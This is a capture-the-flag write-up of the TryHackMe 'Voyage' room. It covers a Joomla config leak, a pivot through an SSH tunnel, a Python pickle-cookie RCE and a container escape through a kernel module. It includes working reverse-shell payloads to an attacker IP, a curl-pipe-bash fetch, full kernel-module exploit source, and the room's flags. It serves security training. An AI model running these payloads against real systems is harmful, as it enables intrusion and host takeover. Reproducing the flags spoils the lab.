# TryHackMe — Voyage Writeup

**Difficulty:** Medium
**Category:** Web, Pivoting, Pickle Deserialization, Container Escape

---


## Reconnaissance

Kicked things off with a full port scan:

```
nmap -Pn -sS -sV -sC -A -T4 -p- 10.48.158.246
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80/tcp   open  http    Apache httpd 2.4.58
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/
| /cache/ /cli/ /components/ /includes/ /installation/
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-generator: Joomla! - Open Source Content Management
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
```

Three ports. Port 80 immediately gives away a **Joomla CMS** from the generator header and the robots.txt — 16 disallowed entries, classic Joomla fingerprint. Two SSH ports is interesting; likely one on the host and one inside a container.

---

## Joomla — Config Leak via Unauthenticated API

Ran dirsearch to confirm the directory structure, which lined up exactly with a default Joomla install. Joomla's REST API has a well-known endpoint that leaks application config when it hasn't been properly locked down:

```
http://10.48.158.246/api/index.php/v1/config/application?public=true
```

The JSON response spilled everything:

```json
"user": "root"
"password": "RootPassword@1234"
"db": "joomla_db"
"host": "localhost"
"dbtype": "mysqli"
```

Anddd there it is — DB root credentials sitting wide open in an unauthenticated API response. Joomla shops, please lock this endpoint down.

---

## Initial Access — SSH into the Container

Tried the leaked password against port 2222 (the second SSH service):

```
ssh root@10.48.158.246 -p 2222
```

```
root@10.48.158.246's password: RootPassword@1234

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.8.0-1031-aws x86_64)
root@f5eb774507f2:~#
```

Shell dropped straight in as root. The hostname `f5eb774507f2` and a quick `ip addr` confirmed we're inside a Docker container with IP `192.168.100.10/24`.

---

## Internal Network Recon

With nmap available in the container, scanned the internal subnet:

```
root@f5eb774507f2:~# nmap -Pn 192.168.100.10/24
```

```
Nmap scan report for ip-192-168-100-1.ap-south-1.compute.internal (192.168.100.1)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
5000/tcp open  upnp

Nmap scan report for voyage_priv2.joomla-net (192.168.100.12)
PORT     STATE SERVICE
5000/tcp open  upnp

Nmap scan report for f5eb774507f2 (192.168.100.10)
PORT   STATE SERVICE
22/tcp open  ssh
```

Two interesting targets. `.100.1` is the host (the box we SSH'd into). `.100.12` is `voyage_priv2.joomla-net` — a second container exposing port **5000**, which is typically Flask. That's our next target.

---

## Pivoting — SSH Tunnel to the Finance Panel

Since the internal service isn't directly reachable from our attack machine, set up a local port forward through the container we already own:

```
ssh -L 9999:192.168.100.12:5000 root@10.48.158.246 -p 2222
```

Now `localhost:9999` tunnels straight into the finance container's Flask app. Navigating there revealed a login page titled **"Tourism Secret Finance Panel"**.

Tried `admin:admin` — logged in. The dashboard showed a classified investor list with a quarterly revenue figure.

---

## Pickle Deserialization RCE

After logging in, checked the cookies. The app sets a `session_data` cookie that's a **hex-encoded Python pickle object**:

```
80049526000000000000007d94288c0475736572948c0561646d696e948c07726576656e7565948c05383530303094752e
```

Decoding that pickle gives `{'user': 'admin', 'revenue': '85000'}` — the app is deserialising user-controlled input server-side. Python's `pickle.loads()` executes arbitrary code during deserialization, which makes this a trivial RCE.

Crafted a malicious pickle payload that spawns a reverse shell:

```python
import pickle
import subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.Popen, (["bash", "-c", "bash -i >& /dev/tcp/192.168.140.36/4444 0>&1"],))

payload = pickle.dumps(Exploit())
print(payload.hex())
```

```
python test.py
8004955b000000000000008c0a73756270726f63657373948c05506f70656e9493945d94288c0462617368948c022d63948c2c
62617368202d69203e26202f6465762f7463702f3139322e3136382e3134302e33362f3434343420303e26319465859452942e
```

Started a listener and fired the payload as the `session_data` cookie:

```
curl -H 'Cookie:session_data=<payload_hex>' http://127.0.0.1:9999
```

```
nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.140.36] from (UNKNOWN) [10.48.158.246] 42622
bash: cannot set terminal process group (1): Inappropriate ioctl for device
root@d221f7bc7bf8:/finance-app#
```

Shell on the finance container as root. Stabilised it with:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## **FLAG 1 — user.txt**

```
root@d221f7bc7bf8:~# cat user.txt
THM{ee346612fb944085af0dd2cd677b1902}
```

---

## Container Escape — cap_sys_module Kernel Module

Pulled down deepce to enumerate the container:

```
curl http://192.168.140.36/deepce.sh | bash
```

The key finding:

```
[+] Dangerous Capabilities .. Yes
cap_chown,cap_dac_override,...,cap_sys_module,...,cap_setfcap=ep
```

**`cap_sys_module`** — the container can load kernel modules. Kernel modules run in ring 0, completely outside any container namespace, meaning we can execute code on the **host** with full kernel privileges. Classic escape.

Wrote a kernel module that calls `call_usermodehelper()` to spawn a reverse shell from the host:

**rev.c:**
```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kmod.h>
MODULE_LICENSE("GPL");

static int start_shell(void) {
    char *argv[] = {
        "/bin/bash", "-c",
        "bash -i >& /dev/tcp/192.168.140.36/4445 0>&1",
        NULL
    };
    static char *env[] = {
        "HOME=/", "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };
    return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}
static int init_mod(void) { return start_shell(); }
static void exit_mod(void) { return; }
module_init(init_mod);
module_exit(exit_mod);
```

**Makefile:**
```makefile
obj-m += rev.o
KVER := 6.8.0-1030-aws
KDIR := /lib/modules/$(KVER)/build
PWD  := $(shell pwd)
all:
	make -C $(KDIR) M=$(PWD) modules
clean:
	make -C $(KDIR) M=$(PWD) clean
```

Served both files from a Python HTTP server on the attack machine, then pulled and compiled inside the container:

```
root@d221f7bc7bf8:/tmp# curl http://192.168.140.36/Makefile -o Makefile
root@d221f7bc7bf8:/tmp# curl http://192.168.140.36/rev.c -o rev.c
root@d221f7bc7bf8:/tmp# make
```

```
make -C /lib/modules/6.8.0-1030-aws/build M=/tmp modules
  CC [M]  /tmp/rev.o
  MODPOST /tmp/Module.symvers
  CC [M]  /tmp/rev.mod.o
  LD [M]  /tmp/rev.ko
```

```
root@d221f7bc7bf8:/tmp# insmod rev.ko
```

```
nc -nvlp 4445
listening on [any] 4445 ...
connect to [192.168.140.36] from (UNKNOWN) [10.48.158.246] 60376
root@ip-10-48-158-246:/#
```

We're on the **host machine**. The module called `call_usermodehelper()` from kernel context, which executes as the host's init namespace root — completely bypassing the container boundary.

---

## **FLAG 2 — root.txt**

```
root@ip-10-48-158-246:/root# cat root.txt
THM{ace91ec899f84498a74629b078bdceff}
```

---

Thanks for reading!
